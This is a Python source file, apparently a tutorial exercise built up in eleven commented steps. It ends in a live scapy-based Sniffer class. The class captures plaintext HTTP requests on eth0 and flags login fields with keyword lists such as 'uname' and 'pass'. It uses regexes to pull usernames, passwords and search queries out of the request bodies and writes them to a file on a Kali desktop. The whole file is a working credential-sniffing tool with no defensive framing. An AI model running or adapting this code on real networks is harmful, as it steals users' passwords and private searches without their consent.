# Step 1 - sniff the interface's raw data

# import scapy.all as scapy
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def filtersniffoutput(packet):
#     print(packet)
#
# sniff('eth0')

# Step 2 - convert sniffed data into http format and filter HTTP request only

# import scapy.all as scapy
# from scapy.layers import http
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def filtersniffoutput(packet):
#     if packet.haslayer(http.HTTPRequest):
#         print(packet.show())
#
# sniff('eth0')

# Step 3 - Filter HTTP Request with Users Input - scapy.Raw layer
#
# import scapy.all as scapy
# from scapy.layers import http
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def filtersniffoutput(packet):
#     if packet.haslayer(http.HTTPRequest):
#         if packet.haslayer(scapy.Raw):
#             print(packet[scapy.Raw].show())
#             print('--------')
#             userinput = packet[scapy.Raw].load
#             print(userinput)
#
# sniff('eth0')

# Step 4 - decode and print only sensitive data
#
# import scapy.all as scapy
# from scapy.layers import http
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def filtersniffoutput(packet):
#     if packet.haslayer(http.HTTPRequest):
#         if packet.haslayer(scapy.Raw):
#             host = packet[http.HTTPRequest].Host.decode()
#             path = packet[http.HTTPRequest].Path.decode()
#             url = host+path
#             userinput = packet.load.decode()
#             keywords = ['uname', 'username', 'Username', 'ID', 'userid', 'pass', 'password', 'passcode', 'pwd', 'Password']
#             for word in keywords:
#                 if word in userinput:
#                     print(userinput)
#                     print(url)
#                     break
#
# sniff('eth0')

# Step 5 -

# Step 6 -
#
# import scapy.all as scapy
# from scapy.layers import http
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def urlparse(packet):
#     host = packet[http.HTTPRequest].Host.decode()
#     path = packet[http.HTTPRequest].Path.decode()
#     url = host + path
#     return url
#
# def credentialsparse(packet):
#     userinput = packet.load.decode()
#     keywords = ['uname', 'username', 'Username', 'ID', 'userid', 'pass', 'password', 'passcode', 'pwd', 'Password']
#     for word in keywords:
#         if word in userinput:
#             return userinput
# #
# def filtersniffoutput(packet):
#     if packet.haslayer(http.HTTPRequest):
#         if packet.haslayer(scapy.Raw):
#             url = urlparse(packet)
#             credentials = credentialsparse(packet)
#             print(url)
#             print(credentials)

# sniff('eth0')

# Step 7 - output parsing by using regular expression
# uname = ([^&]+)

# import re
#
# data = 'uname=mattstanek&pass=thisismy12345thpassword'
#
# matchedusername = re.search(r"uname=([^&]+)", data)
# matchedpassword = re.search(r"pass=([^&]+)", data)
# print(matchedusername.group(1), matchedpassword.group(1))
#
# import scapy.all as scapy
# from scapy.layers import http
# import re
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def urlparse(packet):
#     host = packet[http.HTTPRequest].Host.decode()
#     path = packet[http.HTTPRequest].Path.decode()
#     url = host + path
#     return url
#
# def credentialsparse(packet):
#     userinput = packet.load.decode()
#     keywords = ['uname', 'username', 'Username', 'ID', 'userid', 'pass', 'password', 'passcode', 'pwd', 'Password']
#     for word in keywords:
#         if word in userinput:
#             return userinput
#
# def filtersniffoutput(packet):
#     if packet.haslayer(http.HTTPRequest):
#         if packet.haslayer(scapy.Raw):
#             url = urlparse(packet)
#             credentials = credentialsparse(packet)
#             username = re.search(r"uname=([^&]+)", credentials)
#             password = re.search(r"pass=([^&]+)", credentials)
#             print(url, username.group(1), password.group(1))
#
# sniff('eth0')

# Step 8 - append the result into a list of dictionary

# logindict = []
#
# import scapy.all as scapy
# from scapy.layers import http
# import re
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def urlparse(packet):
#     host = packet[http.HTTPRequest].Host.decode()
#     path = packet[http.HTTPRequest].Path.decode()
#     url = host + path
#     return url
#
# def credentialsparse(packet):
#     global logindict
#     userinput = packet.load.decode()
#     keywords = ['uname', 'username', 'Username', 'ID', 'userid', 'pass', 'password', 'passcode', 'pwd', 'Password']
#     for word in keywords:
#         if word in userinput:
#             username = re.search(r"uname=([^&]+)", userinput)
#             password = re.search(r"pass=([^&]+)", userinput)
#             url = urlparse(packet)
#             logininfo = {'Username':username.group(1), 'Password':password.group(1), 'Website':url}
#             logindict.append(logininfo)
#             break
#
# def filtersniffoutput(packet):
#     global logindict
#     if packet.haslayer(http.HTTPRequest):
#         if packet.haslayer(scapy.Raw):
#             credentialsparse(packet)
#             print(logindict)
#
# sniff('eth0')

# Step 9 - separate the password output function from the sniff output function

# logindict = []
#
# import scapy.all as scapy
# from scapy.layers import http
# import re
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def urlparse(packet):
#     host = packet[http.HTTPRequest].Host.decode()
#     path = packet[http.HTTPRequest].Path.decode()
#     url = host + path
#     return url
#
# def credentialsparse(packet):
#     global logindict
#     userinput = packet.load.decode()
#     usernamekeywords = ['uname', 'username', 'Username', 'ID', 'userid', 'pass', 'password', 'passcode', 'pwd', 'Password']
#     for word in usernamekeywords:
#         if word in userinput:
#             username = re.search(r"uname=([^&]+)", userinput)
#             password = re.search(r"pass=([^&]+)", userinput)
#             url = urlparse(packet)
#             logininfo = {'Username':username.group(1), 'Password':password.group(1), 'Website':url}
#             logindict.append(logininfo)
#             break
#
# def outputformatting1():
#     global logindict
#     for login in logindict:
#         print(f"Username:{login['Username']:<20} Password:{login['Password']:<20} Website:{login['Website']:<50}")
#
# def filtersniffoutput(packet):
#     global logindict
#     if packet.haslayer(http.HTTPRequest):
#         if packet.haslayer(scapy.Raw):
#             credentialsparse(packet)
#
# try:
#     sniff('eth0')
# finally:
#     print(" ")
#     outputformatting1()

# Step 10 - write the captured data into a file
#
# logindict = []
#
# import scapy.all as scapy
# from scapy.layers import http
# import re
#
# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=filtersniffoutput)
#
# def urlparse(packet):
#     host = packet[http.HTTPRequest].Host.decode()
#     path = packet[http.HTTPRequest].Path.decode()
#     url = host + path
#     return url
#
# def credentialsparse(packet):
#     global logindict
#     userinput = packet.load.decode()
#     usernamekeywords = ['uname', 'username', 'Username', 'ID', 'userid', 'pass', 'password', 'passcode', 'pwd', 'Password']
#     for word in usernamekeywords:
#         if word in userinput:
#             username = re.search(r"uname=([^&]+)", userinput)
#             password = re.search(r"pass=([^&]+)", userinput)
#             url = urlparse(packet)
#             logininfo = {'Username':username.group(1), 'Password':password.group(1), 'Website':url}
#             logindict.append(logininfo)
#             break
#
# def outputformatting1():
#     global logindict
#     for login in logindict:
#         print(f"Username:{login['Username']:<20} Password:{login['Password']:<20} Website:{login['Website']:<50}")
#
# def outputformatting2():
#     global logindict
#     for item in logindict:
#         with open("/home/kali/Desktop/NewSniffData",'a') as file:
#             file.write(f"\nUsername: {item['Username']:<20} Password: {item['Password']:<20} Website: {item['Website']:<50}")
#
# def filtersniffoutput(packet):
#     global logindict
#     if packet.haslayer(http.HTTPRequest):
#         if packet.haslayer(scapy.Raw):
#             credentialsparse(packet)
#
# try:
#     sniff('eth0')
# finally:
#     print(" ")
#     outputformatting2()

#Step 11 - Convert to a Class

logindict = []
querydict =[]

import scapy.all as scapy
from scapy.layers import http
import re

class Sniffer:

    def __init__(self,interface):
        self.interface = interface

    def sniff(self):
        scapy.sniff(iface=self.interface, store=False, prn=self.filtersniffoutput)

    def urlparse(self,packet):
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        url = host + path
        return url

    def credentialsparse(self,packet):
        global logindict
        global querydict
        userinput = packet.load.decode()
        usernamekeywords = ['uname', 'username', 'Username', 'ID', 'userid', 'pass', 'password', 'passcode', 'pwd', 'Password']
        querykeywords = ['searchFor', 'queryFor', 'Search', 'Query']
        for word in usernamekeywords:
            if word in userinput:
                username = re.search(r"uname=([^&]+)", userinput)
                password = re.search(r"pass=([^&]+)", userinput)
                url = self.urlparse(packet)
                logininfo = {'Username':username.group(1), 'Password':password.group(1), 'Website':url}
                logindict.append(logininfo)
                break
        for word in querykeywords:
            if word in userinput:
                query = re.search(r"searchFor=([^&]+)", userinput)
                url = self.urlparse(packet)
                queryinfo = {'Query':query.group(1), 'Website':url}
                querydict.append(queryinfo)
                break

    def outputformatting(self):
        global logindict
        global querydict
        with open("/home/kali/Desktop/NewSniffData", "w") as file:
            file.write("CREDENTIALS:")
        for item in logindict:
            with open("/home/kali/Desktop/NewSniffData",'a') as file:
                file.write(f"\nUsername: {item['Username']:<20} Password: {item['Password']:<20} Website: {item['Website']:<50}")
        with open("/home/kali/Desktop/NewSniffData", 'a') as file:
            file.write("\n\nQUERIES:")
        for item in querydict:
            with open("/home/kali/Desktop/NewSniffData", 'a') as file:
                file.write(f"\nQuery: {item['Query']:<20} Website: {item['Website']:<20}")

    def filtersniffoutput(self,packet):
        global logindict
        global querydict
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.Raw):
                self.credentialsparse(packet)

if __name__ == "__main__":
    try:
        Sniffer('eth0').sniff()
    finally:
        print(" ")
        Sniffer('eth0').outputformatting()